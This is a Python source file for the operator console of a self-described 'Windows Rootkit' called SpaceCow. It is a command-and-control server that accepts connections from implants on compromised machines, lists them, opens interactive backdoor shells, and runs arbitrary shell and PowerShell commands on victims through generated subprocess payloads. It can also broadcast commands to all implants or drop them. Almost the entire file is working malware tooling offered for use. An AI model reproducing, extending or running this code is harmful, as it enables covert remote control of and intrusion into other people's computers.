#!/usr/bin/python3

"""
Copyright (c) 2019 TheSphinx
"""

import os
import sys
import socket
import select
import hashlib
import platform
import argparse
import itertools

from datetime import datetime
from threading import Thread
from time import gmtime, strftime, sleep
from colorama import Fore, Back, Style, init

# Modules Imports --------------
from lib import color
from lib import ncrypto
# ------------------------------

# Network settings -------------
PORT_LIST               = []
SERVERS                 = []
__maxconn__             = 1000
__online__              = True
recv_buffer             = 8192
# ------------------------------

# Environment settings ---------
PRIVATEKEY              = ''
PUBLICKEY               = '' 
all_connections         = []
all_addresses           = []
all_hashes              = []
all_times               = []
all_rport               = []
# ==============================
__notifyOnConnection__  = False
__showCommandPayload__  = True
__playAnimation__       = False
# ------------------------------

# ---- ( Encoding & Decoding) ----
def stringToBytes(s):
        return s.encode()
        
def bytesToString(s):
        return s.decode()
# ------------------------------

# ---- ( String Manipulation) ----
def split_str(seq, chunk, skip_tail=False):
    lst = []
    if chunk <= len(seq):
        lst.extend([seq[:chunk]])
        lst.extend(split_str(seq[chunk:], chunk, skip_tail))
    elif not skip_tail and seq:
        lst.extend([seq])
    return lst
# ------------------------------


# ---- ( Network Protocol ) ----
def doShareKey(conn):
    global PRIVATEKEY,PUBLICKEY
    try:
        conn.send(stringToBytes("30+++++"+bytesToString(PRIVATEKEY.exportKey(format='PEM', passphrase=None, pkcs=1))+"+++++"+bytesToString(PUBLICKEY.exportKey(format='PEM', passphrase=None, pkcs=1))))
    except Exception as e:
        color.print_errn("Error on RSA key sharing : " + str(e))

def doSend(connection, command):
    global PUBLICKEY
    allchunks = split_str(command, 10)
    connection.send(stringToBytes('len>'+str(len(allchunks))))
    index = 0
    for packet in allchunks:
        message = ncrypto.encrypt_message(stringToBytes(packet), PUBLICKEY)
        try:
            connection.send(message)
        except Exception as e:
                #color.print_errn("Error on sending packet: %s"%str(e))
                pass
        callback = connection.recv(10)
        index += 1

def doRecv(s):
    global PRIVATEKEY, PUBLICKEY, __playAnimation__
    buffer    = ''
    try:
        chunkslen = bytesToString(s.recv(recv_buffer)) 
        chunkslen = int(chunkslen.split('>')[1]) 
        for x in range(chunkslen):
            try:
                data = bytesToString(s.recv(recv_buffer))
                data = bytesToString(ncrypto.decrypt_message(data,PRIVATEKEY))
                buffer += data
                s.send(stringToBytes('ok'))
            except KeyboardInterrupt:
                __playAnimation__ = False
                color.print_errn("User interrupted data receiving.")
                return buffer
        return buffer
    
    except ValueError as e:
        color.print_errn("Error on receiving packet (Value Error): " + str(e))
        return buffer
    except Exception as e:
        color.print_warn("Packet receiving error => %s"%str(e))
        return buffer

def doListImplants():
    global all_connections, all_addresses, recv_buffer, all_hashes, all_rport, all_times
    results = ''
    for index, conn in enumerate(all_connections):
        try:
            doSend(conn,'20')
            doRecv(conn)
        except:
            del all_connections[index]
            del all_addresses[index]
            del all_hashes[index]
            del all_rport[index]
            del all_times[index]
            continue
        timeago = datetime.now() - all_times[index]
        results += "(%s)[%s] tcp://%s:%s (connected: %.2dH:%.2dm:%.2ds ago) => any:%s\n"%(str(index), all_hashes[index], all_addresses[index][0], all_addresses[index][1], timeago.seconds//3600, (timeago.seconds//60)%60, timeago.seconds%60, all_rport[index])
    color.print_simple_blue("Listing %s implants"%str(len(all_connections)))
    return results
# ------------------------------

def banner():
        """
        Clear console and print banner.
        """
        banner_ = '''
           __n__n__
    .------`-\\00/-'
   /  ##  ## (oo)         
  / \## __   ./ SpaceCow
     |//YY \|/ Windows Rootkit
     |||   |||
     '''
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')

        print(banner_)

# ---- ( Payloads ) ----
# TODO : encode base64 command
def simpleCommandExecution(command):
    plugin = '''
def run():
    # -*- coding: iso-8859-1 -*-
    import subprocess

    cmd = subprocess.Popen("%s", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
    output_bytes = cmd.stdout.read() + cmd.stderr.read()
    return output_bytes'''%command
    return plugin

def PowerShellCommandExecution(command):
    plugin = '''
def run():
    # -*- coding: iso-8859-1 -*-
    import subprocess

    cmd = subprocess.Popen("powershell %s", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
    output_bytes = cmd.stdout.read() + cmd.stderr.read()
    return output_bytes'''%command
    return plugin
# ------------------------------

def doGetUniqueHash(string):
        return hashlib.md5(string.encode('utf-8')).hexdigest()

def doFlushImplants():
    global all_connections, all_addresses, all_hashes, all_times, all_rport
    all_connections = []
    all_addresses = []
    all_hashes = []
    all_times = []
    all_rport = []

def animate():
    index = 0
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if __playAnimation__:
            break
        if index >= 5:
            sys.stdout.write("\rExecuting wait (WOAH! That's a lot of data) " + c)
        else:
            sys.stdout.write("\rExecuting wait " + c)
        sys.stdout.flush()
        sleep(0.1)
        index += 0.1

def doGetPorts(ports):
    global PORT_LIST
    for port in ports.split(','):
        PORT_LIST.append(int(port))
        color.print_info("Opening socket server port => %s"%port)

def doBroadcast(command, type_):
    counter = 0
    for implant in all_connections:
        try:
            if type_ == 1: # 0 => silent, 1 => visible
                print("Broadcast executed on %s/%s"%(str(counter+1), str(len(all_connections))), end="\r")
            doSend(implant,command)
        except Exception as e:
            if "WinError 10054" in str(e):
                pass # drop
    color.empty()

def doStartSocketServer():
    global PORT_LIST, SERVERS, all_addresses, all_connections, all_hashes, all_times, all_rport, __notifyOnConnection__
    try:
        for port in PORT_LIST:
            ds = ("0.0.0.0", port)
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((ds))
            server.listen(__maxconn__)
            SERVERS.append(server)
        while True:
            readable,_,_ = select.select(SERVERS, [], [])
            ready_server = readable[0]
            connection, address = ready_server.accept()
            connection.setblocking(1)
            #if __online__ == False:
            #    break

            implanthash = doGetUniqueHash(address[0])
            implantnow = datetime.now()

            all_addresses.append(address)
            all_connections.append(connection)
            all_hashes.append(implanthash)
            all_times.append(implantnow)
            all_rport.append(ready_server.getsockname()[1])

            if __notifyOnConnection__ and __online__:
                color.print_simple_blue("New client [%s] tcp://%s:%s (connected: now) => any:%s"%(implanthash,
                                                                                                address[0], 
                                                                                                address[1],
                                                                                                ready_server.getsockname()[1]))
            doShareKey(connection)
    except Exception as e:
        color.print_errn("Error: %s"%str(e))

def doDeployShell(conn, index):
    global __showCommandPayload__, __playAnimation__
    index = int(index)
    timeago = datetime.now() - all_times[index]
    color.print_simple_succ("Deploying interactive shell to: (%s)[%s] tcp://%s:%s (connected: %.2dH:%.2dm:%.2ds ago) => any:%s"%(str(index), all_hashes[index], all_addresses[index][0], all_addresses[index][1], timeago.seconds//3600, (timeago.seconds//60)%60, timeago.seconds%60, all_rport[index]))
    color.print_info("Pinging backdoor ...")
    doSend(conn,"10")
    if doRecv(conn) == "10":
        color.print_succ("Backdoor returned code: 10 - Success!")
        doSend(conn, "11")
        while True:
            data = doRecv(conn)
            sys.stdout.write(data + Style.BRIGHT + Fore.RED + " >> " + Style.RESET_ALL)
            cmd = input()
            if cmd == "":
                doSend(conn,"")       
            elif cmd == "exit" or cmd == "background":
                doSend(conn, "exit")
                break
            elif cmd.startswith("EXEC::"):
                command = cmd.split('::')[1]
                plugin = simpleCommandExecution(command)
                if __showCommandPayload__:
                    color.print_simple_blue("Executing payload => '%s'"%plugin)
                    color.empty()
                __playAnimation__ = False
                t = Thread(target=animate)
                t.start()
                doSend(conn,"exec+++++" + plugin)
                data = (doRecv(conn))
                __playAnimation__ = True
                t.join()
                sys.stdout.flush()
                sys.stdout.write("\r")
                print(Fore.GREEN + Style.BRIGHT + "⮡ " + Style.RESET_ALL + u"%s"%data,end="")
                doSend(conn, "200")
            elif cmd.startswith("PSEXEC::"):
                command = cmd.split('::')[1]
                plugin = PowerShellCommandExecution(command)
                if __showCommandPayload__:
                    color.print_simple_blue("Executing payload => '%s'"%plugin)
                    color.empty()
                __playAnimation__ = False
                t = Thread(target=animate)
                t.start()
                doSend(conn,"psexec+++++" + plugin)
                data = (doRecv(conn))
                __playAnimation__ = True
                t.join()
                sys.stdout.flush()
                sys.stdout.write("\r")
                print(Fore.GREEN + Style.BRIGHT + "⮡ " + Style.RESET_ALL + u"%s"%data,end="")
                doSend(conn, "200")
            elif cmd == "help":
                doSend(conn,"101")
            else:
                doSend(conn,cmd)
    else:
        color.print_errn("Backdoor is not responding ...")

def doParse(cmd):
    global __notifyOnConnection__, __online__,__showCommandPayload__
    if cmd != "":
            if cmd == "list":
               print(doListImplants())
            elif cmd.startswith("jump "):
                try:
                    implant = cmd.split(' ')[1]
                    doDeployShell(all_connections[int(implant)], implant)
                except Exception as e:
                    color.print_simple_errno("Error: %s"%str(e))
            elif cmd.startswith("notify connection "):
                try:
                    notify = cmd.split(' ')[2]
                    __notifyOnConnection__ = bool(notify)
                except Exception as e:
                    color.print_simple_errno("Error: %s"%str(e))
            elif cmd.startswith("server "):
                try:
                    command = cmd.split(' ')[1]
                    if command == "online":
                        if __online__ == False:
                            __online__ = True
                            thread = Thread(target = doStartSocketServer)
                            thread.start()
                    else:
                        if __online__:
                            __online__ = False
                            color.print_warn("Server shutted down ...")
                            doFlushImplants()
                except Exception as e:
                    color.print_simple_errno("Error: %s"%str(e))
            elif cmd == "help":
                help()
            elif cmd.startswith("drop "):
                try:
                    implants = cmd.split(' ')[1]
                    if implants == "*":
                        doBroadcast("exit",1)
                    else:
                        choosen = implants.split(',')
                        index = 0
                        for choosen_ in choosen:
                            for implant in all_connections:
                                if all_connections.index(implant) == int(choosen_):
                                    try:
                                        doSend(implant,'exit')
                                        color.print_info("Forwading to => %s"%str(all_addresses[index]))
                                    except Exception as e:
                                        if "WinError 10054" in str(e):
                                            color.print_errn("Error forwading command to => %s (10054)"%str(all_addresses[index]))
                except ValueError:
                    color.print_warn("Warning: reference to implant not listed.")
                except Exception as e:
                    color.print_simple_errno("Error: %s"%str(e))
            else:
                color.print_simple_errno("No such command, use 'help' to get more information")

def cli():
    global __online__, __exited__
    color.empty()
    while True:
        cmd = input(">> ")
        if cmd == "quit":
            if __online__:
                    doBroadcast("exit", 0)
                    __online__ = False
                    doFlushImplants()
                    os._exit(0)
            break
        doParse(cmd)

if __name__ == '__main__':
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', action='store', dest='ports',
                        help='Define the ports for the socket server (ex. 2000,2001,...).')
    parser.add_argument('--version', action='version', version='%(prog)s 1.0')
    results = parser.parse_args()

    if results.ports is not None:
        try:
            color.print_info("Running on => %s"%(platform.system() + " " + platform.release()))
            doGetPorts(results.ports)
            color.print_info("Generating RSA unique keys for encrypted connection")
            PRIVATEKEY, PUBLICKEY = ncrypto.generate_keys()
            thread = Thread(target = doStartSocketServer)
            thread.start()
            cli()
        except KeyboardInterrupt:
            color.empty()
            color.print_errn("User aborted.")
            os._exit(1)
    #print ('ports      =', results.ports)